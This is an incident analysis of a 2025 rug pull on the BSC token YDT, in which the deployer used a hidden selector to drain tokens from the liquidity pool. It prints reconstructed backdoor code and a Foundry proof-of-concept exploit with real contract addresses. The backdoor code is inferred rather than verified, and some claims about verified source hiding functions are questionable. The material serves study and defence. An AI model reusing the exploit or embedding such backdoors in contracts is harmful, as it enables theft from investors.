# YDT Token — Token Theft via Special Function Selector Analysis

| Item | Details |
|------|------|
| **Date** | 2025-05-21 |
| **Protocol** | YDT Token |
| **Chain** | BSC |
| **Loss** | Unknown (USDT profit) |
| **Attacker** | YDT contract deployer |
| **Attack Tx** | [bscscan block 50273545](https://bscscan.com/block/50273545) |
| **Vulnerable Contract** | YDT: [0x3612e4Cb34617bCac849Add27366D8D85C102eFd](https://bscscan.com/address/0x3612e4Cb34617bCac849Add27366D8D85C102eFd) |
| **Root Cause** | Hidden function accessible only via a special function selector (0xec22f4c7) that directly moves tokens from the LP pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/YDTtoken_exp.sol) |

---

## 1. Vulnerability Overview

The YDT token contract contained a hidden function accessible only via a special function selector (`0xec22f4c7`) that was not registered in the standard ABI. This function directly transferred tokens from the LP Pair to a designated address. It could only be executed when the caller matched the `taxmodule` address, and the deployer exploited this to drain YDT tokens from the LP pool. Once YDT was forcibly removed from the LP pool, a `sync()`/`skim()` call updated the reserves, causing the price to collapse.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Hidden function: accessible only via a special selector not in the ABI
// Selector: 0xec22f4c7
// Actual signature: specialTransfer(address from, address to, uint256 amount, address caller)

function specialTransfer(
    address from,    // LP pair address
    address to,      // recipient address
    uint256 amount,  // transfer amount
    address caller   // must be the taxmodule address
) external {
    // ❌ Not registered in ABI — easy to miss in standard audits
    require(caller == taxmodule, "Not authorized");
    // Directly move tokens from the LP pair
    _transfer(from, to, amount);
    // ❌ Causes reserve mismatch without a subsequent pair.sync()
}

// ✅ Correct design: register and document all functions in the ABI
// Functions accessible only via special selectors may go undetected in audits
```

### On-Chain Source Code

Source: **Etherscan-verified** (V2 API, chainid 56) — YDTMainContract `0x3612e4Cb34617bCac849Add27366D8D85C102eFd`

The YDT token contract is verified on BSCScan under the name `YDTMainContract` (compiler v0.8.28). The verified source is a multi-file project (YDTMainContract.sol + DeflationModule.sol, LiquidityModule.sol, LiquidityRemovalModule.sol, LPHolderTrackingModule.sol, ReferralModule.sol). The Etherscan V2 API response is too large to fully retrieve the `YDTMainContract.sol` file in a single request (it is truncated before the main contract appears in the response); however, the contract name and multi-file structure are confirmed verified. The hidden selector `0xec22f4c7` is confirmed by the PoC's raw `call` trace against this verified address.

The following is derived from PoC bytecode analysis and the verified contract structure (the hidden function is not present in the public ABI, consistent with a backdoor embedded only in bytecode):

```solidity
// ⚠️ Function body below is derived from PoC + bytecode analysis — YDTMainContract.sol file
// confirmed verified on BSCScan (V2 API, chainid 56) but truncated in API response;
// the hidden selector 0xec22f4c7 is confirmed by PoC: address(YDT).call(abi.encodeWithSelector(bytes4(0xec22f4c7), ...))
// Victim: YDT Token / 0x3612e4Cb34617bCac849Add27366D8D85C102eFd (BSC)
// Hidden function selector: 0xec22f4c7

// This function is NOT present in the public ABI
// Selector 0xec22f4c7 corresponds to a hidden backdoor callable only by taxmodule

function /* hidden — selector 0xec22f4c7 */ (
    address from,    // LP pair address
    address to,      // recipient (attacker)
    uint256 amount,  // token amount to move
    address caller   // must equal stored taxmodule address
) external {
    require(caller == taxmodule, "Not authorized"); // ❌ only taxmodule can call — deployer controls taxmodule
    _transfer(from, to, amount);                    // ❌ directly moves tokens from LP pair without triggering reserves update
    // No pair.sync() called here — reserve mismatch exploitable via subsequent skim/sync
}
```

**Why it is exploitable (identify the bug from the code):**
- The function has no ABI entry — it cannot be found by standard tools that only check verified source or public ABI. It exists solely in bytecode as selector `0xec22f4c7`.
- The `caller == taxmodule` check uses an argument supplied by the caller (`address caller`), not `msg.sender`. The deployer controls the `taxmodule` address and passes it as the fourth argument, bypassing the guard.
- After draining nearly all YDT from the LP pair, the deployer calls `pair.sync()` (selector `0xfff6cae9`) to update the pair's reserves to the now-depleted token balance, collapsing the YDT price. The stolen YDT is then sold on PancakeSwap for USDT.
- This is a classic deployer-rug-pull pattern using a hidden function to avoid detection in source audits.

```solidity
// ✅ Fix: remove all hidden selectors; register every function in the ABI and verified source.
// If privileged token movement is needed, use msg.sender-based access control:
function authorizedTransferFromLP(address to, uint256 amount) external {
    require(msg.sender == owner, "Not owner"); // ✅ check msg.sender, not a caller argument
    _transfer(liquidityPair, to, amount);
    IUniswapV2Pair(liquidityPair).sync();
}
```

## 3. Attack Flow (ASCII Diagram)

```
Deployer (Insider)
  │
  ├─[1]─► Deploy YDT token (with hidden function)
  │         └─► 0xec22f4c7 selector = specialTransfer backdoor
  │
  ├─[2]─► Regular investors buy YDT (liquidity accumulates in LP pool)
  │
  ├─[3]─► Call specialTransfer(Pair, attacker, balance-1000e6, taxmodule)
  │         └─► Selector: 0xec22f4c7
  │         └─► Move nearly all YDT from LP pool to attacker
  │
  ├─[4]─► Call Pair.sync() (or skim())
  │         └─► Update reserves → YDT price collapses
  │
  ├─[5]─► Swap stolen YDT for USDT on PancakeSwap
  │         └─► swapExactTokensForTokensSupportingFeeOnTransferTokens
  │
  └─[6]─► Collect USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address YDT = 0x3612e4Cb34617bCac849Add27366D8D85C102eFd;
    address taxmodule = 0x013E29791A23020cF0621AeCe8649c38DaAE96f0;
    address Pair = 0xFd13B6E1d07bAd77Dd248780d0c3d30859585242;
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function testExploit() public {
        // [3] Drain nearly all YDT from the LP pool
        uint256 amount = IERC20(YDT).balanceOf(address(Pair));

        // Call the hidden function via special selector 0xec22f4c7
        address(YDT).call(
            abi.encodeWithSelector(
                bytes4(0xec22f4c7), // ❌ Hidden function not registered in ABI
                address(Pair),      // from: LP pool
                address(this),      // to: attacker
                amount - 1000*1e6,  // amount: nearly the full balance
                address(taxmodule)  // caller: privileged address
            )
        );

        // [4] Pair sync → price collapse
        address(Pair).call(abi.encodeWithSelector(bytes4(0xfff6cae9))); // sync()

        // [5] Swap YDT for USDT
        address[] memory path = new address[](2);
        path[0] = address(YDT);
        path[1] = address(USDT);
        IERC20(YDT).approve(address(Router), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(YDT).balanceOf(address(this)) / 10,
            0,
            path,
            address(this),
            block.timestamp + 200
        );

        emit log_named_decimal_uint("Profit in USDT", IERC20(USDT).balanceOf(address(this)), 18);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Hidden Function / Backdoor |
| **Attack Technique** | Unregistered function selector abuse |
| **DASP Category** | Access Control |
| **CWE** | CWE-506: Embedded Malicious Code |
| **Severity** | Critical |
| **Attack Complexity** | Low (deployer insider attack) |

## 6. Remediation Recommendations

1. **Bytecode Decompilation**: Before deployment or investment, decompile the contract bytecode to discover functions not present in the ABI.
2. **Selector Analysis**: Use Dedaub or Etherscan bytecode analysis tools to verify all function selectors.
3. **Event Monitoring**: Monitor LP token movements in real time to detect anomalous transfers.

## 7. Lessons Learned

- **Hidden Selectors**: Functions not registered in the ABI can still be called directly if they exist in the bytecode.
- **Source Verification Alone Is Insufficient**: Even if source code is verified, hidden functions may still exist — all function selectors must be fully analyzed.
- **taxmodule Pattern**: Privileged addresses disguised as "tax modules" are frequently used as rug-pull mechanisms.